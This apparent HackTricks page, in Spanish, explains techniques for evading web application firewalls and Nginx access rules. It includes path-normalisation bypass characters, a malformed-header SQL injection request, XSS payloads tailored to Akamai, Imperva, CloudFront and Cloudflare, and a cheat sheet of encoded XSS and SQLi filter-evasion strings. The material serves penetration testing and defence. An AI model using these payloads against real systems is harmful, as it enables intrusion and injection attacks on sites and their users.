# Proxy / Bypass de Protecciones WAF

{{#include ../banners/hacktricks-training.md}}


## Bypass de Reglas ACL de Nginx con Manipulación de Nombres de Ruta <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Técnicas [de esta investigación](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Ejemplo de regla de Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Para prevenir bypasses, Nginx realiza la normalización de rutas antes de verificarla. Sin embargo, si el servidor backend realiza una normalización diferente (eliminando caracteres que Nginx no elimina), podría ser posible eludir esta defensa.

### **NodeJS - Express**

| Versión de Nginx | **Caracteres de Bypass de Node.js** |
| ---------------- | ----------------------------------- |
| 1.22.0           | `\xA0`                              |
| 1.21.6           | `\xA0`                              |
| 1.20.2           | `\xA0`, `\x09`, `\x0C`              |
| 1.18.0           | `\xA0`, `\x09`, `\x0C`              |
| 1.16.1           | `\xA0`, `\x09`, `\x0C`              |

### **Flask**

| Versión de Nginx | **Caracteres de Bypass de Flask**                                   |
| ---------------- | --------------------------------------------------------------- |
| 1.22.0           | `\x85`, `\xA0`                                                  |
| 1.21.6           | `\x85`, `\xA0`                                                  |
| 1.20.2           | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0           | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1           | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Versión de Nginx | **Caracteres de Bypass de Spring Boot** |
| ---------------- | --------------------------------------- |
| 1.22.0           | `;`                                     |
| 1.21.6           | `;`                                     |
| 1.20.2           | `\x09`, `;`                             |
| 1.18.0           | `\x09`, `;`                             |
| 1.16.1           | `\x09`, `;`                             |

### **PHP-FPM**

Configuración de Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx está configurado para bloquear el acceso a `/admin.php`, pero es posible eludir esto accediendo a `/admin.php/index.php`.

### Cómo prevenir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Confusión de Ruta

[**En esta publicación**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) se explica que ModSecurity v3 (hasta 3.0.12), **implementó incorrectamente la variable `REQUEST_FILENAME`** que se suponía debía contener la ruta accedida (hasta el inicio de los parámetros). Esto se debe a que realizó una decodificación de URL para obtener la ruta.\
Por lo tanto, una solicitud como `http://example.com/foo%3f';alert(1);foo=` en mod security supondrá que la ruta es solo `/foo` porque `%3f` se transforma en `?` finalizando la ruta de la URL, pero en realidad la ruta que un servidor recibirá será `/foo%3f';alert(1);foo=`.

Las variables `REQUEST_BASENAME` y `PATH_INFO` también se vieron afectadas por este error.

Algo similar ocurrió en la versión 2 de Mod Security que permitió eludir una protección que impedía a los usuarios acceder a archivos con extensiones específicas relacionadas con archivos de respaldo (como `.bak`) simplemente enviando el punto codificado en URL como `%2e`, por ejemplo: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Encabezado Malformado

[Esta investigación](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) menciona que era posible eludir las reglas de AWS WAF aplicadas sobre encabezados HTTP enviando un encabezado "malformado" que no fue analizado correctamente por AWS, pero sí por el servidor backend.

Por ejemplo, enviando la siguiente solicitud con una inyección SQL en el encabezado X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Fue posible eludir AWS WAF porque no entendía que la siguiente línea es parte del valor del encabezado, mientras que el servidor NODEJS sí lo hacía (esto fue corregido).

## Eludidas genéricas de WAF

### Límites de tamaño de solicitud

Comúnmente, los WAF tienen un cierto límite de longitud de solicitudes para verificar y si una solicitud POST/PUT/PATCH supera este límite, el WAF no revisará la solicitud.

- Para AWS WAF, puedes [**consultar la documentación**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Tamaño máximo de un cuerpo de solicitud web que puede ser inspeccionado para las protecciones de Application Load Balancer y AWS AppSync</td><td>8 KB</td></tr><tr><td>Tamaño máximo de un cuerpo de solicitud web que puede ser inspeccionado para las protecciones de CloudFront, API Gateway, Amazon Cognito, App Runner y Verified Access**</td><td>64 KB</td></tr></tbody></table>

- De [**documentación de Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Los Firewalls de Aplicaciones Web más antiguos con Core Rule Set 3.1 (o inferior) permiten mensajes más grandes que **128 KB** al desactivar la inspección del cuerpo de la solicitud, pero estos mensajes no serán revisados en busca de vulnerabilidades. Para versiones más nuevas (Core Rule Set 3.2 o más recientes), se puede hacer lo mismo desactivando el límite máximo del cuerpo de la solicitud. Cuando una solicitud excede el límite de tamaño:

Si **modo de prevención**: Registra y bloquea la solicitud.\
Si **modo de detección**: Inspecciona hasta el límite, ignora el resto y registra si el `Content-Length` excede el límite.

- De [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Por defecto, el WAF inspecciona solo los primeros 8KB de una solicitud. Puede aumentar el límite hasta 128KB añadiendo Metadatos Avanzados.

- De [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Hasta 128KB.

### Ofuscación <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Compatibilidad de Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

Dependiendo de la implementación de la normalización de Unicode (más información [aquí](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), los caracteres que comparten compatibilidad de Unicode pueden ser capaces de eludir el WAF y ejecutarse como la carga útil prevista. Los caracteres compatibles se pueden encontrar [aquí](https://www.compart.com/en/unicode).

#### Ejemplo <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a>

Como se menciona en [**esta publicación del blog**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), para eludir WAFs capaces de mantener un contexto de la entrada del usuario, podríamos abusar de las técnicas del WAF para normalizar realmente la entrada de los usuarios.

Por ejemplo, en la publicación se menciona que **Akamai decodificó una entrada de usuario 10 veces**. Por lo tanto, algo como `<input/%2525252525252525253e/onfocus` será visto por Akamai como `<input/>/onfocus`, lo que **podría pensar que está bien ya que la etiqueta está cerrada**. Sin embargo, mientras la aplicación no decodifique la entrada 10 veces, la víctima verá algo como `<input/%25252525252525253e/onfocus`, que **sigue siendo válido para un ataque XSS**.

Por lo tanto, esto permite **ocultar cargas útiles en componentes codificados** que el WAF decodificará e interpretará mientras que la víctima no lo hará.

Además, esto se puede hacer no solo con cargas útiles codificadas en URL, sino también con otras codificaciones como unicode, hex, octal...

En la publicación se sugieren los siguientes bypass finales:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

También se menciona que dependiendo de **cómo algunos WAFs entienden el contexto** de la entrada del usuario, podría ser posible abusar de ello. El ejemplo propuesto en el blog es que Akamai permite poner cualquier cosa entre `/*` y `*/` (potencialmente porque esto se usa comúnmente como comentarios). Por lo tanto, una inyección SQL como `/*'or sleep(5)-- -*/` no será detectada y será válida ya que `/*` es la cadena de inicio de la inyección y `*/` está comentada.

Estos tipos de problemas de contexto también se pueden usar para **abusar de otras vulnerabilidades que no se espera** que sean explotadas por el WAF (por ejemplo, esto también podría usarse para explotar un XSS).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generar una URL de API gateway para usar con ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Similar a fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Plugin de Burp Suite que utiliza IPs de API gateway
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Un número determinado dinámicamente de instancias de contenedor se activan según el tamaño del archivo de entrada y el factor de división, con la entrada dividida en fragmentos para ejecución paralela, como 100 instancias procesando 100 fragmentos de un archivo de entrada de 10,000 líneas con un factor de división de 100 líneas.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Se pueden utilizar diferentes técnicas para eludir los filtros regex en los firewalls. Los ejemplos incluyen alternar mayúsculas y minúsculas, agregar saltos de línea y codificar cargas útiles. Los recursos para los diversos bypass se pueden encontrar en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) y [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Los ejemplos a continuación se extrajeron de [este artículo](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Herramientas

- [**nowafpls**](https://github.com/assetnote/nowafpls): complemento de Burp para agregar datos basura a las solicitudes para eludir WAFs por longitud

## Referencias

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)


{{#include ../banners/hacktricks-training.md}}
